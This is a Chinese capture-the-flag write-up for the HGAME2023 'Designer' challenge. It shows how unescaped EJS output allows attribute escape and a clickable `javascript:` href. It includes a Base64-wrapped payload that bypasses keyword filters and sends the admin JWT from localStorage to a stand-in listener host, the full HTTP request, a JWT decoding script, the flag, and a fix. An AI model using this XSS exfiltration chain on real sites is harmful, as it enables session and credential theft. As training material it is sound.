# Designer

## 题目简述

应用允许用户在 `/button/edit` 定制按钮 CSS，并在 `/button/preview` 预览。EJS 模板把用户提供的属性名和值用非转义标签 `<%- ... %>` 写入 `<a>` 标签的 `style` 属性，因此攻击者可以闭合属性并注入新的 `href`。

管理员机器人会打开分享的预览页面并点击按钮。管理员注册时由本地地址条件获得真实 flag，JWT 保存在 `localStorage` 中；目标是通过点击型 XSS 把这个 JWT 外带出来。

## 解题过程

存在问题的模板可整理为：

```ejs
<div class="button-wrapper">
  <a
    class="button"
    id="button"
    style="<% for (const key in data) { %><%- key %>:<%- data[key] %>;<% } %>"
  >CLICK ME</a>
</div>
```

`<%=` 会对 HTML 特殊字符转义，而 `<%-` 直接输出原始内容。正常输入：

```json
{"color":"red"}
```

会生成：

```html
<a style="color:red;">CLICK ME</a>
```

若在值中加入引号，则可以逃出 `style` 并构造新属性：

```json
{"color":"red\" href=\"javascript:alert(1)"}
```

渲染结果相当于：

```html
<a style="color:red;" href="javascript:alert(1)">CLICK ME</a>
```

常见的 `onclick` 不可用，因为过滤器禁止了 `on`；但机器人会主动点击 `<a>`，所以 `javascript:` URI 仍可执行。服务端还过滤了 `localStorage`、`fetch`、`XMLHttpRequest`、`window`、`location` 和 `document` 等字面量，可通过字符串拼接或 Base64 包装绕过。例如，先准备外带脚本：

```javascript
new Image().src =
  "https://listener.example/?token=" +
  globalThis["local" + "Storage"].getItem("token")
```

把 `listener.example` 换成自己的回连域名，再将整段脚本做 Base64 编码。以上示例对应的 URI 为：

```text
javascript:eval(atob('bmV3IEltYWdlKCkuc3JjPSJodHRwczovL2xpc3RlbmVyLmV4YW1wbGUvP3Rva2VuPSIrZ2xvYmFsVGhpc1sibG9jYWwiKyJTdG9yYWdlIl0uZ2V0SXRlbSgidG9rZW4iKQ=='))
```

再把整个 URI 作为上面 `href` 注入的值保存并提交 `/button/share`。与官方题解相同的请求结构如下，其中 Base64 内容应替换为自己的外带脚本，回调地址也必须使用自己控制的地址：

```http
POST /button/share HTTP/1.1
Host: challenge.example
Content-Type: application/json

{"box-shadow":"3px 3px #000\" href=\"javascript:eval(atob('bmV3IEltYWdlKCkuc3JjPSJodHRwczovL2xpc3RlbmVyLmV4YW1wbGUvP3Rva2VuPSIrZ2xvYmFsVGhpc1sibG9jYWwiKyJTdG9yYWdlIl0uZ2V0SXRlbSgidG9rZW4iKQ=='))"}
```

管理员机器人访问预览页、设置自己的 JWT 并点击按钮后，回调服务会收到 `token` 参数。解码 JWT 的 payload 即可读取其中的真实 `flag` 字段；也可以把 JWT 传给题目提供的 `/user/info` 接口解析：

```python
import base64
import json
import os

token = os.environ["HGAME_ADMIN_JWT"]
payload = token.split(".")[1]
payload += "=" * (-len(payload) % 4)
print(json.loads(base64.urlsafe_b64decode(payload)))
```

公开参赛者题解保存的管理员 JWT payload 中，`flag` 字段为：

```text
hgame{b_c4re_ab0ut_prop3rt1ty_injEctiOn}
```

原 PDF 只给出利用链和绕过思路，结果由 [HGAME2023 官方题解仓库](https://github.com/vidar-team/HGAME2023_Writeup) 收录的参赛者 Week2 题解补全。EJS 转义标签的行为可在 [EJS 官方文档](https://ejs.co/#docs) 中核对。

## 方法总结

本题的完整链条是“未转义模板输出 → 属性逃逸 → `javascript:` 点击执行 → 管理员 JWT 外带”。仅过滤事件属性或若干 JavaScript 标识符无法阻止 XSS，因为浏览器还有 URI 执行、字符串重组和动态求值等路径。正确修复应对 CSS 属性和值做白名单校验，并使用 HTML 转义输出；管理凭据也不应暴露给可执行不可信脚本的页面上下文。
